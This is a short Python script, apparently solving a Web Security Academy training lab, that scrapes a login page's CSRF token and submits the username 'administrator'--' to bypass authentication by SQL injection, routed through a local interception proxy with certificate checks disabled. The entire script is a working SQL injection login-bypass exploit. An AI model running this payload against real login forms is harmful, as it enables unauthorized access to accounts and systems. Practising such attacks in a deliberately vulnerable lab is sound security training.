import http
import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
url = 'https://ac9f1fce1e90bc10c0832fe20013007d.web-security-academy.net/login'


# Get CSRF token
s = requests.Session()
response = s.get(url, verify=False, proxies=proxies)
# if 'csrf' in response.cookies:
#     csrf_token = response.cookies['csrf']
soup = BeautifulSoup(response.text, 'html.parser')
csrf_token = soup.find("input")['value']
data = {"csrf": csrf_token, "username": "administrator'--", "password":"pass"}

result = s.post(url, verify=False, data=data)
